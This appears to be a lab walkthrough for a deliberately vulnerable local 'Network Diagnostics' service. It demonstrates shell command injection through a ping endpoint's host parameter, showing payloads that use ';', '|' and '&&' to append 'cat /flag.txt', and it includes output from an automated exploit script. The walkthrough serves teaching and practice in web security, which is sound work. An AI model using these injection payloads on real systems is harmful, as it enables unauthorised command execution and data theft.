# Walkthrough: Command Injection

## Setup

```bash
docker compose up --build -d
```

Confirm the service:

```bash
curl http://localhost:8080/
```

Output:
```json
{
  "service": "Network Diagnostics v1.0",
  "endpoints": [
    "GET  /ping?host=<host>  -- ping a host",
    "POST /ping              -- ping via JSON body {\"host\": \"...\"}"
  ]
}
```

## Step 1: Probe the Endpoint

Send a clean request to see the command the server builds:

```bash
curl "http://localhost:8080/ping?host=127.0.0.1"
```

Output:
```json
{
  "command": "ping -c 3 127.0.0.1",
  "output": "PING 127.0.0.1 (127.0.0.1): 56 data bytes\n...\n3 packets transmitted, 3 received, 0% packet loss",
  "injected": false
}
```

The user input lands directly in the command string.

## Step 2: Inject a Second Command

The semicolon separates two shell commands. The server runs `ping` first, then `cat /flag.txt`:

```bash
curl "http://localhost:8080/ping?host=127.0.0.1;cat /flag.txt"
```

Output:
```json
{
  "command": "ping -c 3 127.0.0.1;cat /flag.txt",
  "output": "PING 127.0.0.1 ...\n3 packets transmitted, 3 received, 0% packet loss\nPOC{...}",
  "injected": true
}
```

## Step 3: Alternative Payloads

Pipe operator:
```bash
curl "http://localhost:8080/ping?host=127.0.0.1|cat /flag.txt"
```

Logical AND:
```bash
curl "http://localhost:8080/ping?host=127.0.0.1&&cat /flag.txt"
```

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8080
```

Output:
```
[*] Target: http://localhost:8080
[*] Service: Network Diagnostics v1.0

[*] Sending injection: 127.0.0.1;cat /flag.txt
[*] Server executed: ping -c 3 127.0.0.1;cat /flag.txt

[*] Output:
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.412 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.391 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.403 ms
--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
POC{...}

[+] Flag: POC{...}
```
